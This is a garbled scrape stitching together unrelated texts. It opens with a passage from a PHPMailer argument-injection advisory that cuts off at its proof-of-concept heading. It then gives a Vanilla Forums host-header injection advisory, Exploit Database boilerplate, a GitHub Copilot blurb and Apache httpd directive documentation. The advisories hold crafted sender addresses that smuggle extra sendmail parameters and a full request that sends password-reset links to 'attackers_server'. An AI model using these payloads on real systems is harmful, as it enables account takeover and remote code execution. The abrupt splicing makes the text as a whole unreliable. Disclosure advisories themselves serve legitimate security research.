Further research however shown that the validation is done using the RFC 3696 specification.

The RFC allows emails to contain spaces when quoted with ".
According to the spec, the following email address is valid:

" some test email address with spaces"@weird-email.com

The following Sender address:

"Attacker -Param2 -Param3"@test.com

would cause PHPMailer/mail() function to execute /usr/bin/sendmail with the
following list of arguments:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker -Param2 -Param3@test.com]

which would not work for the attacker (Param2 and Param3 are passed within
the same argument of argv[3] )

Attackers can however break out of parameter no.3 with some extra escaping.

For example, by injecting an extra sequence of \" after the first argument,
the following Sender email:

"Attacker \" -Param2 -Param3"@test.com

when passed to PHPMailer (and eventually to mail()) function would cause
sendmail to execute with:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com]

Which as can be seen would inject additional parameters of 4 & 5 to sendmail.

Attackers can exploit this to achieve code execution as shown in the PoC
below.

V. PROOF OF CONCEPT EXPLOIT

- Release date: 11.05.2017
- Revision 1.0
- Severity: Medium
=============================================

I. VULNERABILITY
-------------------------

Vanilla Forums <= 2.3 Host Header Injection CVE-2016-10073 [0day]

II. BACKGROUND
-------------------------

"Community Forums Reinvented
Create an online community that your customers will love. Vanilla's forum
software is used by top brands to engage customers, drive loyalty and reduce
support costs."

"Vanilla provides cloud and open source community forum software that powers
discussion forums worldwide with close to 1M downloads.

community solution in the world."

<https://vanillaforums.com/en/software/>
<https://open.vanillaforums.com/>

III. INTRODUCTION
-------------------------

Vanilla Forums software (including the latest stable version of 2.3 in
its default configuration) is affected by:

* Host Header Injection CVE-2016-10073 (0day)

which can be exploited by unauthenticated remote attackers to potentially
intercept password reset hash and gain unauthorized access to the victim
account or perform web-cache poisoning attacks.

IV. DESCRIPTION
-------------------------

Vanilla Forums software, in its default configuration, makes use of
user-supplied HTTP HOST header (CVE-2016-10073) when sending emails
from the host on which the forum was installed.

The HOST header is used to form the sender email address as we can see
in the following snippet of code:

------[ library/core/class.email.php ]------

...

public function from($SenderEmail = '', $SenderName = '', $bOverrideSender = false) {
        if ($SenderEmail == '') {
            $SenderEmail = c('Garden.Email.SupportAddress', '');
            if (!$SenderEmail) {
                $SenderEmail = 'noreply@'.Gdn::request()->host();
            }
        }

        if ($SenderName == '') {
            $SenderName = c('Garden.Email.SupportName', c('Garden.Title', ''));
        }

        if ($this->PhpMailer->Sender == '' || $bOverrideSender) {
            $this->PhpMailer->Sender = $SenderEmail;
        }

        ob_start();
        $this->PhpMailer->setFrom($SenderEmail, $SenderName, false);
        ob_end_clean();
        return $this;
}

...

-----------------------------------------

As we can see by default, Vanilla will use the 'noreply@HOST' address where
HOST is obtained from the client HTTP request.

V. PROOF OF CONCEPT
-------------------------

An attacker may use HTTP HOST header to set the email domain to an arbitrary
host. For example. Sending the following HTTP request:

------------

POST /vanilla2-3/entry/passwordrequest HTTP/1.1
Host: attackers_server
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: close
Content-Length: 149

hpt=&Target=discussions&ClientHour=2017-05-10+22%3A00&Email=victim&Request+a+new+password=Request+a+new+password&DeliveryType=VIEW&DeliveryMethod=JSON

------------

will result in the following email sent to the victim:

------------

To: victim@victim-server.com
Subject: [Vanilla 2.3] Reset Your Password
X-PHP-Originating-Script: 0:class.phpmailer.php
Date: Thu, 11 May 2017 09:42:13 +0000
Return-Path: noreply@attackers_server
Message-ID: <a989e3868a609316dd9a7d7a991d79e5@attackers_server>
X-Mailer: PHPMailer 5.1 (phpmailer.sourceforge.net)
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="utf-8"

Vanilla 2.3 [http://attackers_server/vanilla2-3/=0A=0A=0A=0AReset](http://attackers_server/vanilla2-3/%3D0A%3D0A%3D0A%3D0AReset) Your Passw=
ord=0A=0A=0A=0AWe've received a request to change your password at Vanilla =
2.3. If you didn't make this request, please ignore this email.=0A=0A=0A=0A=
Change My Password: [http://attackers_server/vanilla2-3/entry/passwordreset/=](http://attackers_server/vanilla2-3/entry/passwordreset/%3D)
2/PdNvqaPnnFaG

------------

Because of the HOST header set to:
Host: attackers_server

The resulting email will have the sender's address set to noreply@attackers_server.
The password reset link will also contain the attacker's server which could
allow the attacker to intercept the hash if the victim user clicked on the
malicious link.

VI. BUSINESS IMPACT
-------------------------

With victim user interaction, attacker could potentially intercept the password
reset hash.

This vulnerability may also lead to web-cache poisoning if the HOST header
is used to form links in web responses. See references for more details
on this vector.

VII. SYSTEMS AFFECTED
-------------------------

The latest stable release of Vanilla Forums available at the official website:

<https://open.vanillaforums.com/addon/vanilla-core-2.3>

was confirmed to be vulnerable.
Previous versions are also likely to be vulnerable.

This vulnerability can also be combined with CVE-2016-10033 vulnerability
to achieve Unauthenticated Remote Code Execution as described in a separate
advisory.

VIII. SOLUTION
-------------------------

This vulnerability was reported to Vanilla Forums support team in December
2016. Despite the acknowledgment of the issue by the team, it has remained
unpatched for over 5 months.
As there has been no progress or further updates, this advisory is finally
released to the public without an official patch.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Accelerate performance

With GitHub Copilot embedded throughout the platform, you can simplify your toolchain, automate tasks, and improve the developer experience.

![](https://github.githubassets.com/assets/particles-de1dd20f3008.png)A Copilot chat window with extensions enabled. The user inputs the @ symbol to reveal a list of five Copilot Extensions. @Sentry is selected from the list, which shifts the window to a chat directly with that extension. There are three sample prompts at the bottom of the chat window, allowing the user to Get incident information, Edit status on incident, or List the latest issues. The last one is activated to send the prompt: @Sentry List the latest issues. The extension then lists several new issues and their metadata.

## AcceptFilter Directive

| [Description:](directive-dict.html#Description) | Configures optimizations for a Protocol's Listener Sockets |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `AcceptFilter protocol accept_filter` |
| [Context:](directive-dict.html#Context) | server config |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

This directive enables operating system specific optimizations for a
listening socket by the `Protocol` type.
The basic premise is for the kernel to not send a socket to the server
process until either data is received or an entire HTTP Request is buffered.
Only [FreeBSD's Accept Filters](http://www.freebsd.org/cgi/man.cgi?query=accept_filter&sektion=9), Linux's more primitive
`TCP_DEFER_ACCEPT`, and Windows' optimized AcceptEx()
are currently supported.

Using `none` for an argument will disable any accept filters
for that protocol. This is useful for protocols that require a server
send data first, such as `ftp:` or `nntp`:

```
AcceptFilter nntp none
```

The default protocol names are `https` for port 443
and `http` for all other ports. To specify that another
protocol is being used with a listening port, add the protocol
argument to the `[Listen](../mod/mpm_common.html#listen)`
directive.

The default values on FreeBSD are:

```
AcceptFilter http httpready
AcceptFilter https dataready
```

The `httpready` accept filter buffers entire HTTP requests at
the kernel level. Once an entire request is received, the kernel then
sends it to the server. See the
[accf\_http(9)](http://www.freebsd.org/cgi/man.cgi?query=accf_http&sektion=9) man page for more details. Since HTTPS requests are
encrypted, only the [accf\_data(9)](http://www.freebsd.org/cgi/man.cgi?query=accf_data&sektion=9) filter is used.

The default values on Linux are:

```
AcceptFilter http data
AcceptFilter https data
```

Linux's `TCP_DEFER_ACCEPT` does not support buffering http
requests. Any value besides `none` will enable
`TCP_DEFER_ACCEPT` on that listener. For more details
see the Linux
[tcp(7)](http://man7.org/linux/man-pages/man7/tcp.7.html) man page.

The default values on Windows are:

```
AcceptFilter http connect
AcceptFilter https connect
```

Window's mpm\_winnt interprets the AcceptFilter to toggle the AcceptEx()
API, and does not support http protocol buffering. `connect`
will use the AcceptEx() API, also retrieve the network endpoint
addresses, but like `none` the `connect` option
does not wait for the initial data transmission.

On Windows, `none` uses accept() rather than AcceptEx()
and will not recycle sockets between connections. This is useful for
network adapters with broken driver support, as well as some virtual
network providers such as vpn drivers, or spam, virus or spyware
filters.

### The `data` AcceptFilter (Windows)

For versions 2.4.23 and prior, the Windows `data` accept
filter waited until data had been transmitted and the initial data
buffer and network endpoint addresses had been retrieved from the
single AcceptEx() invocation. This implementation was subject to a
denial of service attack and has been disabled.

Current releases of httpd default to the `connect` filter
on Windows, and will fall back to `connect` if
`data` is specified. Users of prior releases are encouraged
to add an explicit setting of `connect` for their
AcceptFilter, as shown above.

## AcceptPathInfo Directive

| [Description:](directive-dict.html#Description) | Resources accept trailing pathname information |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `AcceptPathInfo On|Off|Default` |
| [Default:](directive-dict.html#Default) | `AcceptPathInfo Default` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

This directive controls whether requests that contain trailing
pathname information that follows an actual filename (or
non-existent file in an existing directory) will be accepted or
rejected. The trailing pathname information can be made
available to scripts in the `PATH_INFO` environment
variable.

For example, assume the location `/test/` points to
a directory that contains only the single file
`here.html`. Then requests for
`/test/here.html/more` and
`/test/nothere.html/more` both collect
`/more` as `PATH_INFO`.

The three possible arguments for the
`AcceptPathInfo` directive are:

`Off`A request will only be accepted if it
maps to a literal path that exists. Therefore a request with
trailing pathname information after the true filename such as
`/test/here.html/more` in the above example will return
a 404 NOT FOUND error.
`On`A request will be accepted if a
leading path component maps to a file that exists. The above
example `/test/here.html/more` will be accepted if
`/test/here.html` maps to a valid file.
`Default`The treatment of requests with
trailing pathname information is determined by the [handler](../handler.html) responsible for the request.
The core handler for normal files defaults to rejecting
`PATH_INFO` requests. Handlers that serve scripts, such as [cgi-script](mod_cgi.html) and [isapi-handler](mod_isapi.html), generally accept
`PATH_INFO` by default.

The primary purpose of the `AcceptPathInfo`
directive is to allow you to override the handler's choice of
accepting or rejecting `PATH_INFO`. This override is required,
for example, when you use a [filter](../filter.html), such
as [INCLUDES](mod_include.html), to generate content
based on `PATH_INFO`. The core handler would usually reject
the request, so you can use the following configuration to enable
such a script:

```
<Files "mypaths.shtml">
  Options +Includes
  SetOutputFilter INCLUDES
  AcceptPathInfo On
</Files>
```

## AccessFileName Directive

| [Description:](directive-dict.html#Description) | Name of the distributed configuration file |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `AccessFileName filename [filename] ...` |
| [Default:](directive-dict.html#Default) | `AccessFileName .htaccess` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

While processing a request, the server looks for
the first existing configuration file from this list of names in
every directory of the path to the document, if distributed
configuration files are [enabled for that
directory](#allowoverride). For example:

```
AccessFileName .acl
```

Before returning the document
`/usr/local/web/index.html`, the server will read
`/.acl`, `/usr/.acl`,
`/usr/local/.acl` and `/usr/local/web/.acl`
for directives unless they have been disabled with:

```
<Directory "/">
    AllowOverride None
</Directory>
```

## AddDefaultCharset Directive

| [Description:](directive-dict.html#Description) | Default charset parameter to be added when a response content-type is `text/plain` or `text/html` |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `AddDefaultCharset On|Off|charset` |
| [Default:](directive-dict.html#Default) | `AddDefaultCharset Off` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

This directive specifies a default value for the media type
charset parameter (the name of a character encoding) to be added
to a response if and only if the response's content-type is either
`text/plain` or `text/html`. This should override
any charset specified in the body of the response via a `META`
element, though the exact behavior is often dependent on the user's client
configuration. A setting of `AddDefaultCharset Off`
disables this functionality. `AddDefaultCharset On` enables
a default charset of `iso-8859-1`. Any other value is assumed
to be the charset to be used, which should be one of the
[IANA registered
charset values](http://www.iana.org/assignments/character-sets) for use in Internet media types (MIME types).
For example:

```
AddDefaultCharset utf-8
```

`AddDefaultCharset` should only be used when all
of the text resources to which it applies are known to be in that
character encoding and it is too inconvenient to label their charset
individually. One such example is to add the charset parameter
to resources containing generated content, such as legacy CGI
scripts, that might be vulnerable to cross-site scripting attacks
due to user-provided data being included in the output. Note, however,
that a better solution is to just fix (or delete) those scripts, since
setting a default charset does not protect users that have enabled
the "auto-detect character encoding" feature on their browser.

## AllowEncodedSlashes Directive

| [Description:](directive-dict.html#Description) | Determines whether encoded path separators in URLs are allowed to be passed through |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `AllowEncodedSlashes On|Off|NoDecode` |
| [Default:](directive-dict.html#Default) | `AllowEncodedSlashes Off` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | NoDecode option available in 2.3.12 and later. |

The `AllowEncodedSlashes` directive allows URLs
which contain encoded path separators (`%2F` for `/`
and additionally `%5C` for `\` on accordant systems)
to be used in the path info.

With the default value, `Off`, such URLs are refused
with a 404 (Not found) error.

With the value `On`, such URLs are accepted, and encoded
slashes are decoded like all other encoded characters.

With the value `NoDecode`, such URLs are accepted, but
encoded slashes are not decoded but left in their encoded state.

Turning `AllowEncodedSlashes` `On` is
mostly useful when used in conjunction with `PATH_INFO`.

### Note

If encoded slashes are needed in path info, use of `NoDecode` is
strongly recommended as a security measure. Allowing slashes
to be decoded could potentially allow unsafe paths.

## AllowOverride Directive

| [Description:](directive-dict.html#Description) | Types of directives that are allowed in `.htaccess` files |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `AllowOverride All|None|directive-type [directive-type] ...` |
| [Default:](directive-dict.html#Default) | `AllowOverride None (2.3.9 and later), AllowOverride All (2.3.8 and earlier)` |
| [Context:](directive-dict.html#Context) | directory |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

When the server finds an `.htaccess` file (as
specified by `[AccessFileName](#accessfilename)`),
it needs to know which directives declared in that file can override
earlier configuration directives.

### Only available in <Directory> sections

`AllowOverride` is valid only in
`[<Directory>](#directory)`
sections specified without regular expressions, not in `[<Location>](#location)`, `[<DirectoryMatch>](#directorymatch)` or
`[<Files>](#files)` sections.

When this directive is set to `None` and `[AllowOverrideList](#allowoverridelist)` is set to
`None`, [.htaccess](#accessfilename) files are
completely ignored. In this case, the server will not even attempt
to read `.htaccess` files in the filesystem.

When this directive is set to `All`, then any
directive which has the .htaccess [Context](directive-dict.html#Context) is allowed in
`.htaccess` files.

The directive-type can be one of the following
groupings of directives. (See the [override class
index](overrides.html) for an up-to-date listing of which directives are enabled by each
directive-type.)

[AuthConfig](overrides.html#override-authconfig)
Allow use of the authorization directives (`[AuthDBMGroupFile](../mod/mod_authz_dbm.html#authdbmgroupfile)`,
`[AuthDBMUserFile](../mod/mod_authn_dbm.html#authdbmuserfile)`,
`[AuthGroupFile](../mod/mod_authz_groupfile.html#authgroupfile)`,
`[AuthName](../mod/mod_authn_core.html#authname)`,
`[AuthType](../mod/mod_authn_core.html#authtype)`, `[AuthUserFile](../mod/mod_authn_file.html#authuserfile)`, `[Require](../mod/mod_authz_core.html#require)`, *etc.*).
[FileInfo](overrides.html#override-fileinfo)
Allow use of the directives controlling document types
(`[ErrorDocument](#errordocument)`,
`[ForceType](#forcetype)`,
`[LanguagePriority](../mod/mod_negotiation.html#languagepriority)`,
`[SetHandler](#sethandler)`,
`[SetInputFilter](#setinputfilter)`,
`[SetOutputFilter](#setoutputfilter)`, and
`[mod_mime](../mod/mod_mime.html)` Add\* and Remove\* directives),
document meta data (`[Header](../mod/mod_headers.html#header)`, `[RequestHeader](../mod/mod_headers.html#requestheader)`, `[SetEnvIf](../mod/mod_setenvif.html#setenvif)`, `[SetEnvIfNoCase](../mod/mod_setenvif.html#setenvifnocase)`, `[BrowserMatch](../mod/mod_setenvif.html#browsermatch)`, `[CookieExpires](../mod/mod_usertrack.html#cookieexpires)`, `[CookieDomain](../mod/mod_usertrack.html#cookiedomain)`, `[CookieStyle](../mod/mod_usertrack.html#cookiestyle)`, `[CookieTracking](../mod/mod_usertrack.html#cookietracking)`, `[CookieName](../mod/mod_usertrack.html#cookiename)`),
`[mod_rewrite](../mod/mod_rewrite.html)` directives (`[RewriteEngine](../mod/mod_rewrite.html#rewriteengine)`, `[RewriteOptions](../mod/mod_rewrite.html#rewriteoptions)`, `[RewriteBase](../mod/mod_rewrite.html#rewritebase)`, `[RewriteCond](../mod/mod_rewrite.html#rewritecond)`, `[RewriteRule](../mod/mod_rewrite.html#rewriterule)`),
`[mod_alias](../mod/mod_alias.html)` directives (`[Redirect](../mod/mod_alias.html#redirect)`, `[RedirectTemp](../mod/mod_alias.html#redirecttemp)`, `[RedirectPermanent](../mod/mod_alias.html#redirectpermanent)`, `[RedirectMatch](../mod/mod_alias.html#redirectmatch)`), and
`[Action](../mod/mod_actions.html#action)` from
`[mod_actions](../mod/mod_actions.html)`.

[Indexes](overrides.html#override-indexes)
Allow use of the directives controlling directory indexing
(`[AddDescription](../mod/mod_autoindex.html#adddescription)`,
`[AddIcon](../mod/mod_autoindex.html#addicon)`, `[AddIconByEncoding](../mod/mod_autoindex.html#addiconbyencoding)`,
`[AddIconByType](../mod/mod_autoindex.html#addiconbytype)`,
`[DefaultIcon](../mod/mod_autoindex.html#defaulticon)`, `[DirectoryIndex](../mod/mod_dir.html#directoryindex)`, [`FancyIndexing`](mod_autoindex.html#indexoptions.fancyindexing), `[HeaderName](../mod/mod_autoindex.html#headername)`, `[IndexIgnore](../mod/mod_autoindex.html#indexignore)`, `[IndexOptions](../mod/mod_autoindex.html#indexoptions)`, `[ReadmeName](../mod/mod_autoindex.html#readmename)`,
*etc.*).
[Limit](overrides.html#override-limit)
Allow use of the directives controlling host access (`[Allow](../mod/mod_access_compat.html#allow)`, `[Deny](../mod/mod_access_compat.html#deny)` and `[Order](../mod/mod_access_compat.html#order)`).
Nonfatal=[Override|Unknown|All]
Allow use of AllowOverride option to treat syntax errors in
.htaccess as nonfatal. Instead of causing an Internal Server
Error, disallowed or unrecognised directives will be ignored
and a warning logged:

* **Nonfatal=Override** treats directives
  forbidden by AllowOverride as nonfatal.
* **Nonfatal=Unknown** treats unknown directives
  as nonfatal. This covers typos and directives implemented
  by a module that's not present.
* **Nonfatal=All** treats both the above as nonfatal.

Note that a syntax error in a valid directive will still cause
an internal server error.

### Security

Nonfatal errors may have security implications for .htaccess users.
For example, if AllowOverride disallows AuthConfig, users'
configuration designed to restrict access to a site will be disabled.

[Options](overrides.html#override-options)[=Option,...]
Allow use of the directives controlling specific directory
features (`[Options](#options)` and
`[XBitHack](../mod/mod_include.html#xbithack)`).
An equal sign may be given followed by a comma-separated list, without
spaces, of options that may be set using the `[Options](#options)` command.
### Implicit disabling of Options

Even though the list of options that may be used in .htaccess files
can be limited with this directive, as long as any `[Options](#options)` directive is allowed any
other inherited option can be disabled by using the non-relative
syntax. In other words, this mechanism cannot force a specific option
to remain *set* while allowing any others to be set.

```
AllowOverride Options=Indexes,MultiViews
```

Example:

```
AllowOverride AuthConfig Indexes
```

In the example above, all directives that are neither in the group
`AuthConfig` nor `Indexes` cause an internal
server error.

For security and performance reasons, do not set
`AllowOverride` to anything other than `None`
in your `<Directory "/">` block. Instead, find (or
create) the `<Directory>` block that refers to the
directory where you're actually planning to place a
`.htaccess` file.

## AllowOverrideList Directive

| [Description:](directive-dict.html#Description) | Individual directives that are allowed in `.htaccess` files |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `AllowOverrideList None|directive [directive-type] ...` |
| [Default:](directive-dict.html#Default) | `AllowOverrideList None` |
| [Context:](directive-dict.html#Context) | directory |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

When the server finds an `.htaccess` file (as
specified by `[AccessFileName](#accessfilename)`),
it needs to know which directives declared in that file can override
earlier configuration directives.

### Only available in <Directory> sections

`AllowOverrideList` is valid only in
`[<Directory>](#directory)`
sections specified without regular expressions, not in `[<Location>](#location)`, `[<DirectoryMatch>](#directorymatch)` or
`[<Files>](#files)` sections.

When this directive is set to `None` and `[AllowOverride](#allowoverride)` is set to `None`,
then [.htaccess](#accessfilename) files are completely
ignored. In this case, the server will not even attempt to read
`.htaccess` files in the filesystem.

Example:

```
AllowOverride None
AllowOverrideList Redirect RedirectMatch
```

In the example above, only the `Redirect` and
`RedirectMatch` directives are allowed. All others will
cause an internal server error.

Example:

```
AllowOverride AuthConfig
AllowOverrideList CookieTracking CookieName
```

In the example above, `[AllowOverride](#allowoverride)`
grants permission to the `AuthConfig`
directive grouping and `AllowOverrideList` grants
permission to only two directives from the `FileInfo` directive
grouping. All others will cause an internal server error.

## CGIMapExtension Directive

| [Description:](directive-dict.html#Description) | Technique for locating the interpreter for CGI scripts |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `CGIMapExtension cgi-path .extension` |
| [Context:](directive-dict.html#Context) | directory, .htaccess |
| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | NetWare only |

This directive is used to control how Apache httpd finds the
interpreter used to run CGI scripts. For example, setting
`CGIMapExtension sys:\foo.nlm .foo` will
cause all CGI script files with a `.foo` extension to
be passed to the FOO interpreter.

[![top](../images/up.gif)](#page-header)
## CGIPassAuth Directive

| [Description:](directive-dict.html#Description) | Enables passing HTTP authorization headers to scripts as CGI variables |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `CGIPassAuth On|Off` |
| [Default:](directive-dict.html#Default) | `CGIPassAuth Off` |
| [Context:](directive-dict.html#Context) | directory, .htaccess |
| [Override:](directive-dict.html#Override) | AuthConfig |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Available in Apache HTTP Server 2.4.13 and later |

`CGIPassAuth` allows scripts access to HTTP
authorization headers such as `Authorization`, which is
required for scripts that implement HTTP Basic authentication.
Normally these HTTP headers are hidden from scripts. This is to disallow
scripts from seeing user ids and passwords used to access the server when
HTTP Basic authentication is enabled in the web server. This directive
should be used when scripts are allowed to implement HTTP Basic
authentication.

This directive can be used instead of the compile-time setting
`SECURITY_HOLE_PASS_AUTHORIZATION` which has been available
in previous versions of Apache HTTP Server.

The setting is respected by any modules which use
`ap_add_common_vars()`, such as `[mod_cgi](../mod/mod_cgi.html)`,
`[mod_cgid](../mod/mod_cgid.html)`, `[mod_proxy_fcgi](../mod/mod_proxy_fcgi.html)`,
`[mod_proxy_scgi](../mod/mod_proxy_scgi.html)`, and so on. Notably, it affects
modules which don't handle the request in the usual sense but
still use this API; examples of this are `[mod_include](../mod/mod_include.html)`
and `[mod_ext_filter](../mod/mod_ext_filter.html)`. Third-party modules that don't
use `ap_add_common_vars()` may choose to respect the setting
as well.

## CGIVar Directive

| [Description:](directive-dict.html#Description) | Controls how some CGI variables are set |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `CGIVar variable rule` |
| [Context:](directive-dict.html#Context) | directory, .htaccess |
| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Available in Apache HTTP Server 2.4.21 and later |

This directive controls how some CGI variables are set.

**REQUEST\_URI** rules:

`original-uri` (default)
The value is taken from the original request line, and will not
reflect internal redirects or subrequests which change the requested
resource.
`current-uri`
The value reflects the resource currently being processed,
which may be different than the original request from the client
due to internal redirects or subrequests.

[![top](../images/up.gif)](#page-header)
## ContentDigest Directive

| [Description:](directive-dict.html#Description) | Enables the generation of `Content-MD5` HTTP Response headers |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ContentDigest On|Off` |
| [Default:](directive-dict.html#Default) | `ContentDigest Off` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | Options |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

This directive enables the generation of
`Content-MD5` headers as defined in RFC1864
respectively RFC2616.

MD5 is an algorithm for computing a "message digest"
(sometimes called "fingerprint") of arbitrary-length data, with
a high degree of confidence that any alterations in the data
will be reflected in alterations in the message digest.

The `Content-MD5` header provides an end-to-end
message integrity check (MIC) of the entity-body. A proxy or
client may check this header for detecting accidental
modification of the entity-body in transit. Example header:

`Content-MD5: AuLb7Dp1rqtRtxz2m9kRpA==`

Note that this can cause performance problems on your server
since the message digest is computed on every request (the
values are not cached).

`Content-MD5` is only sent for documents served
by the `[core](../mod/core.html)`, and not by any module. For example,
SSI documents, output from CGI scripts, and byte range responses
do not have this header.

[![top](../images/up.gif)](#page-header)
## DefaultRuntimeDir Directive

| [Description:](directive-dict.html#Description) | Base directory for the server run-time files |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `DefaultRuntimeDir directory-path` |
| [Default:](directive-dict.html#Default) | `DefaultRuntimeDir DEFAULT_REL_RUNTIMEDIR (logs/)` |
| [Context:](directive-dict.html#Context) | server config |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Available in Apache 2.4.2 and later |

The `DefaultRuntimeDir` directive sets the
directory in which the server will create various run-time files
(shared memory, locks, etc.). If set as a relative path, the full path
will be relative to `ServerRoot`.

**Example**

```
DefaultRuntimeDir scratch/
```

The default location of `DefaultRuntimeDir` may be
modified by changing the `DEFAULT_REL_RUNTIMEDIR` #define
at build time.

Note: `ServerRoot` should be specified before this
directive is used. Otherwise, the default value of `ServerRoot`
would be used to set the base directory.

### See also

* [the
  security tips](../misc/security_tips.html#serverroot) for information on how to properly set
  permissions on the `ServerRoot`

[![top](../images/up.gif)](#page-header)
## DefaultType Directive

| [Description:](directive-dict.html#Description) | This directive has no effect other than to emit warnings if the value is not `none`. In prior versions, DefaultType would specify a default media type to assign to response content for which no other media type configuration could be found. |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `DefaultType media-type|none` |
| [Default:](directive-dict.html#Default) | `DefaultType none` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | The argument `none` is available in Apache httpd 2.2.7 and later. All other choices are DISABLED for 2.3.x and later. |

This directive has been disabled. For backwards compatibility
of configuration files, it may be specified with the value
`none`, meaning no default media type. For example:

```
DefaultType None
```

`DefaultType None` is only available in
httpd-2.2.7 and later.

Use the mime.types configuration file and the
`[AddType](../mod/mod_mime.html#addtype)` to configure media
type assignments via file extensions, or the
`[ForceType](#forcetype)` directive to configure
the media type for specific resources. Otherwise, the server will
send the response without a Content-Type header field and the
recipient may attempt to guess the media type.

[![top](../images/up.gif)](#page-header)
## Define Directive

| [Description:](directive-dict.html#Description) | Define a variable |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `Define parameter-name [parameter-value]` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

In its one parameter form, `Define` is
equivalent to passing the `-D` argument to
`[httpd](../programs/httpd.html)`. It can be used to toggle the use of
`[<IfDefine>](#ifdefine)`
sections without needing to alter `-D` arguments in any
startup scripts.

In addition to that, if the second parameter is given, a config variable
is set to this value. The variable can be used in the configuration using
the `${VAR}` syntax. The variable is always globally defined
and not limited to the scope of the surrounding config section.

```
<IfDefine TEST>
  Define servername test.example.com
</IfDefine>
<IfDefine !TEST>
  Define servername www.example.com
  Define SSL
</IfDefine>

